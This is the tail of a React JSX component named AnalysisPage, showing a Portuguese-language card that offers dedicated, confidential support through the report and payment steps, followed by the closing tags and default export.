              <div className="rounded-2xl border border-slate-200 bg-white/95 p-6 shadow-sm">
                <div className="flex items-center gap-3 text-slate-700">
                  <ShieldCheck className="h-5 w-5" />
                  <span className="text-sm font-semibold uppercase tracking-[0.18em]">Suporte dedicado</span>
                </div>
                <p className="mt-3 text-sm text-slate-600">
                  Atendimento sigiloso para orientar cada etapa do relatório e do pagamento.
                </p>
              </div>
            </div>
          </div>
        </div>
        </section>

      </main>
    </div>
  )
}

export default AnalysisPage
